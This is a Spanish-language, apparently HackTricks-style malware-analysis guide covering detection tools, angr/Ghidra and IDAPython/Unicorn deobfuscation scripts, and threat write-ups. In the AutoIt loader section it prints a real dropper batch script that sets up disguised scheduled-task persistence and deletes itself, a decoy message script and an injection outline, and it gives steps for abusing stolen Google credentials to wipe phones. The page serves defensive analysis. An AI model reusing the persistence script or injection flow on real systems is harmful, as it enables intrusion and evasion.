# Análisis de Malware

{{#include ../../banners/hacktricks-training.md}}

## CheatSheets de Forense

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Servicios en línea

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Herramientas antivirus y de detección sin conexión

### Yara

#### Instalación
```bash
sudo apt-get install -y yara
```
#### Preparar reglas

Usa este script para descargar y fusionar todas las reglas yara de malware desde github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Crea el directorio _**rules**_ y ejecútalo. Esto creará un archivo llamado _**malware_rules.yar**_ que contiene todas las reglas yara para malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Escaneo
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Detectar malware y crear reglas

Puedes usar la herramienta [**YaraGen**](https://github.com/Neo23x0/yarGen) para generar yara rules a partir de un binario. Consulta estos tutoriales: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalación
```
sudo apt-get install -y clamav
```
#### Escaneo
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** detecta **capacidades** potencialmente maliciosas en ejecutables: PE, ELF, .NET. Así encontrará cosas como tácticas Att\&ck, o capacidades sospechosas como:

- comprobar error de OutputDebugString
- ejecutarse como servicio
- crear proceso

Consíguelo en el [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC significa Indicador de Compromiso. Un IOC es un conjunto de **condiciones que identifican** algún software potencialmente no deseado o **malware** confirmado. Los Blue Teams usan este tipo de definición para **buscar este tipo de archivos maliciosos** en sus **sistemas** y **redes**.\
Compartir estas definiciones es muy útil, ya que cuando se identifica malware en un equipo y se crea un IOC para ese malware, otros Blue Teams pueden usarlo para identificar el malware más rápido.

Una herramienta para crear o modificar IOCs es [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Puedes usar herramientas como [**Redline**](https://www.fireeye.com/services/freeware/redline.html) para **buscar IOCs definidos en un dispositivo**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) es un escáner para Indicadores simples de compromiso.\
La detección se basa en cuatro métodos de detección:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) es un escáner de malware para Linux lanzado bajo la licencia GNU GPLv2, diseñado en torno a las amenazas que se enfrentan en entornos de hosting compartido. Utiliza datos de amenaza de sistemas de detección de intrusiones en el borde de la red para extraer malware que se está usando activamente en ataques y genera firmas para su detección. Además, los datos de amenaza también se obtienen de envíos de usuarios mediante la función LMD checkout y recursos de la comunidad de malware.

### rkhunter

Herramientas como [**rkhunter**](http://rkhunter.sourceforge.net) pueden usarse para inspeccionar el sistema de archivos en busca de posibles **rootkits** y malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) es una herramienta que intentará encontrar cadenas **obfuscated** dentro de ejecutables usando diferentes técnicas.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) revisa algunas cosas básicas dentro del ejecutable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) es una herramienta que permite obtener información de ejecutables de Windows como imports, exports, headers, pero también comprobará virus total y encontrará posibles Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) es una herramienta para detectar si un archivo está **encrypted** y también encontrar **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) es un script en Python que utiliza una variedad de **statistical methods** para detectar contenido **obfuscated** y **encrypted** dentro de archivos de texto/script. El propósito previsto de NeoPI es ayudar en la **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) hace todo lo posible por detectar **obfuscated**/**dodgy code** así como archivos que usan funciones **PHP** que a menudo se usan en **malwares**/webshells.

### Apple Binary Signatures

Al revisar alguna **malware sample** siempre debes **check the signature** del binario, ya que el **developer** que la firmó puede estar ya **related** con **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Técnicas de detección

### File Stacking

Si sabes que alguna carpeta que contiene los **archivos** de un servidor web fue **actualizada por última vez en cierta fecha**. **Comprueba** la **fecha** en que todos los **archivos** en el **servidor web** fueron creados y modificados y si alguna fecha es **sospechosa**, revisa ese archivo.

### Baselines

Si los archivos de una carpeta **no deberían haber sido modificados**, puedes calcular el **hash** de los **archivos originales** de la carpeta y **compararlos** con los actuales. Cualquier cosa modificada será **sospechosa**.

### Statistical Analysis

Cuando la información se guarda en logs puedes **comprobar estadísticas como cuántas veces se accedió a cada archivo del servidor web, ya que un web shell podría ser uno de los más**.

---

### Android in-app native telemetry (no root)

En Android, puedes instrumentar código nativo dentro del proceso de la app objetivo precargando una pequeña librería logger antes de que otras libs JNI se inicialicen. Esto proporciona visibilidad temprana del comportamiento nativo sin hooks a nivel de sistema ni root. Un enfoque popular es SoTap: colocar libsotap.so para el ABI correcto dentro del APK e inyectar una llamada System.loadLibrary("sotap") temprano (por ejemplo, en un inicializador estático o en Application.onCreate), luego recopilar logs desde rutas internas/externas o usar Logcat como fallback.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Some Android malware and RASP-protected apps hide JNI method names and signatures by decoding them at runtime before calling RegisterNatives. When Frida/ptrace instrumentation is killed by anti-debug, you can still recover the plaintext offline by executing the in-binary decoder with angr and then pushing results back into Ghidra as comments.

Key idea: treat the decoder inside the .so as a callable function, execute it on the obfuscated byte blobs in .rodata, and concretize the output bytes up to the first \x00 (C-string terminator). Keep angr and Ghidra using the same image base to avoid address mismatches.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr setup and offline decoder execution</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- A gran escala, construye un mapa estático de call sites a los argumentos del decodificador (encoded_ptr, size). Los wrappers pueden ocultar argumentos, así que puedes crear este mapeo manualmente desde los xrefs de Ghidra si la recuperación de API es ruidosa.

<details>
<summary>Decodificar en lote múltiples call sites con angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Anotar call sites en Ghidra
Opción A: escritor de comentarios solo en Jython (usa un JSON precomputado)
- Dado que angr requiere CPython3, mantén la desofuscación y la anotación separadas. Primero ejecuta el script de angr anterior para generar decoded_strings.json. Luego ejecuta este GhidraScript en Jython para escribir PRE_COMMENTs en cada call site (e incluir el caller function name para contexto):

<details>
<summary>Script Jython de Ghidra para anotar cadenas JNI decodificadas</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opción B: Script CPython único mediante pyhidra/ghidra_bridge
- Alternativamente, usa pyhidra o ghidra_bridge para controlar la API de Ghidra desde el mismo proceso CPython que ejecuta angr. Esto permite llamar a decode_string() y establecer inmediatamente PRE_COMMENTs sin un fichero intermedio. La lógica replica el script Jython: construir un mapa callsite→function mediante ReferenceManager, decodificar con angr y poner los comentarios.

Por qué funciona y cuándo usarlo
- La ejecución offline evita RASP/anti-debug: no ptrace, no Frida hooks necesarios para recuperar strings.
- Mantener alineados Ghidra y angr base_addr (p. ej., 0x00100000) asegura que las direcciones de funciones/datos coincidan entre las herramientas.
- Receta repetible para decoders: tratar la transformación como una función pura, asignar un buffer de salida en un estado nuevo, llamarla con (encoded_ptr, out_ptr, len), luego concretizar vía state.solver.eval y parsear C-strings hasta \x00.

Notas y advertencias
- Respeta el ABI/convención de llamadas objetivo. angr.factory.callable elige una según arch; si los argumentos parecen desplazados, especifica cc explícitamente.
- Si el decoder espera buffers de salida inicializados a cero, inicializa outbuf con ceros en el state antes de la llamada.
- Para .so de Android position-independent, siempre suministra base_addr para que las direcciones en angr coincidan con las vistas en Ghidra.
- Usa currentProgram.getReferenceManager() para enumerar call-xrefs incluso si la app envuelve el decoder detrás de thin stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Desofuscando el control de flujo dinámico (JMP/CALL RAX Dispatchers)

Las familias modernas de malware abusan mucho de la obfuscación Control-Flow Graph (CFG): en lugar de un salto/llamada directo calculan el destino en tiempo de ejecución y ejecutan `jmp rax` o `call rax`. Un pequeño *dispatcher* (típicamente nueve instrucciones) establece el objetivo final dependiendo de las banderas `ZF`/`CF` de la CPU, rompiendo por completo la recuperación estática del CFG.

La técnica —demostrada por el loader SLOW#TEMPEST— puede ser derrotada con un flujo de trabajo de tres pasos que solo depende de IDAPython y del emulador de CPU Unicorn.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Extraer el dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emularlo dos veces con Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Ejecute `run(code,0,0)` y `run(code,1,1)` para obtener los destinos de las ramas *false* y *true*.

### 4. Restaurar un jump / call directo
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Después de parchear, fuerza a IDA a reanalizar la función para restaurar el CFG completo y la salida de Hex-Rays:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Etiquetar llamadas API indirectas

Una vez que se conoce el destino real de cada `call rax`, puedes indicarle a IDA cuál es para que los tipos de parámetros y los nombres de variables se recuperen automáticamente:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Beneficios prácticos

* Restaura el CFG real → la descompilación pasa de *10* líneas a miles.
* Permite string-cross-reference & xrefs, haciendo la reconstrucción del comportamiento trivial.
* Scripts son reutilizables: insértalos en cualquier loader protegido por el mismo truco.

---

## Cargadores basados en AutoIt: descifrado .a3x, mascarada de Task Scheduler e inyección de RAT

Este patrón de intrusión encadena un MSI firmado, AutoIt loaders compilados a .a3x, y una tarea de Task Scheduler que se hace pasar por una aplicación benigna.

### MSI → custom actions → AutoIt orchestrator

Árbol de procesos y comandos ejecutados por las custom actions del MSI:

- MsiExec.exe → cmd.exe para ejecutar install.bat
- WScript.exe para mostrar un diálogo de error señuelo
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (deposita loader, configura persistence, se autolimpia):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (cebo de usuario):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Artefactos clave y mascarada:
- Deja AutoIt3.exe e IoKlTr.au3 en C:\Users\Public\Music
- Copia schtasks.exe a hwpviewer.exe (mascara como Hangul Word Processor viewer)
- Crea una tarea programada "IoKlTr" que se ejecuta cada 1 minuto
- Startup LNK visto como Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Coloca módulos en subcarpetas de %APPDATA%\Google\Browser\ que contienen `adb` o `adv` y los inicia mediante los helpers autoit.vbs/install.bat

Consejos de triaje forense:
- schtasks enumeration: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Busca copias renombradas de schtasks.exe colocadas junto al Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Rutas comunes: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Correlaciona la creación de procesos: AutoIt3.exe lanza binarios legítimos de Windows (p. ej., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- Los módulos AutoIt se compilan con `#AutoIt3Wrapper_Outfile_type=a3x` y desencriptan payloads embebidos antes de inyectarlos en procesos benignos.
- Familias observadas: QuasarRAT (inyectado en hncfinder.exe) y RftRAT/RFTServer (inyectado en cleanmgr.exe), así como módulos RemcosRAT (`Remcos\RunBinary.a3x`).
- Patrón de desencriptación: derivar una clave AES vía HMAC, desencriptar el blob embebido y luego inyectar el módulo en texto plano.

Esqueleto genérico de desencriptación (el input/algoritmo HMAC exacto es específico de la familia):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) del host objetivo (p. ej., cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory con el módulo/shellcode descifrado
- CreateRemoteThread o QueueUserAPC para ejecutar el payload

Hunting ideas
- AutoIt3.exe parented por MsiExec.exe o WScript.exe que lanza utilidades del sistema
- Archivos con extensión `.a3x` o runners de scripts AutoIt bajo rutas públicas/escribibles por el usuario
- Tareas programadas sospechosas que ejecutan AutoIt3.exe o binarios no firmados por Microsoft, con disparadores a nivel de minutos

### Account-takeover abuse of Android Find My Device (Find Hub)

Durante la intrusión en Windows, los operadores usaron credenciales de Google robadas para borrar repetidamente los dispositivos Android de la víctima, suprimiendo las notificaciones mientras ampliaban el acceso a través del messenger de escritorio con sesión iniciada de la víctima.

Pasos del operador (desde una sesión de navegador con sesión iniciada):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repetir para retrasar la recuperación
- Opcional: borrar los correos de alerta en el buzón vinculado (p. ej., Naver) para ocultar las notificaciones de seguridad

## Tracing heavily obfuscated Node.js loaders

Los atacantes empaquetan cada vez más loaders JavaScript dentro de binarios Windows independientes compilados con [`nexe`](https://github.com/nexe/nexe), de modo que el runtime viaja junto con el script. El PE resultante suele pesar 60–90 MB y se ejecuta incluso si Node.js no está instalado. Durante el triage:

- Usar [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) para extraer el JavaScript embebido del PE y pasarlo a herramientas locales para diffing estático.
- Esperar un mutex en disco en `%TEMP%` (GachiLoader deja un archivo aleatorio `<name>.lock` que expira después de ~5 minutos). Copiar el archivo al sandbox antes de la ejecución permite omitir etapas redundantes mientras aún se observan payloads posteriores.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hookea módulos core dentro de cualquier proceso Node.js, te permite falsear probes anti-VM y preserva cada artefacto que la muestra escribe. Lanzar scripts ofuscados a través del tracer mantiene la instrumentación controlada por el analista en la pila de llamadas:
```powershell
node -r .\tracer.js main.js
```
Las opciones clave de configuración dentro de `tracer.js` te permiten:

- Registrar actividad de filesystem, child-process y HTTP (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Cada archivo dejado —como `kidkadi.node`— se copia al directorio de trabajo antes de que el malware lo elimine.
- Anular huellas del entorno devolviendo recuentos realistas de RAM/CPU, falsificando la salida de `tasklist` y manipulando respuestas de PowerShell/WMI. Esto elude loaders que exigen ≥4 GB RAM, ≥2 cores, y analizan nombres de usuario (`mashinesssss`, `wdagutilityaccount`, etc.), hostnames (`desktop-vrsqlag`, `server1` …) y nombres de procesos (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Neutralizar comprobaciones de hardware WMI como `Get-WmiObject Win32_DiskDrive` (buscando `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (bloqueando “VirtualBox Graphics Adapter”, “Hyper-V Video”, etc.) y recuentos de `Win32_PortConnector`. Cuando esas sondas informan hardware “real”, los sandboxes ya no entran en el bucle infinito de llamadas benignas `Invoke-WebRequest` a `linkedin.com`, `grok.com`, `whatsapp.com` y dominios similares que GachiLoader usa para hacer perder tiempo al análisis.

### Captura automática del tráfico C2 restringido

Los network hooks del tracer revelan la autenticación C2 multinivel sin revertir la ofuscación JavaScript. En la campaña observada el loader:

1. Hace POST de la telemetría del host a `/log` en cada C2 hard-coded.
2. Realiza un `GET /richfamily/<per-sample key>` con `X-Secret: gachifamily` para recuperar una URL de payload codificada en Base64.
3. Ejecuta un `GET` final a esa URL con un largo header `X-Secret` por muestra; si falta, devuelve `403 Forbidden`.

Porque el tracer registra complete requests (headers, bodies, destinations), puedes reproducir el mismo tráfico para obtener payloads, volcar shells Themida/VMProtect en memoria y extraer datos de configuración de Rhadamanthys a escala.

## AdaptixC2: Configuration Extraction and TTPs

Ver la página dedicada:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Referencias

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
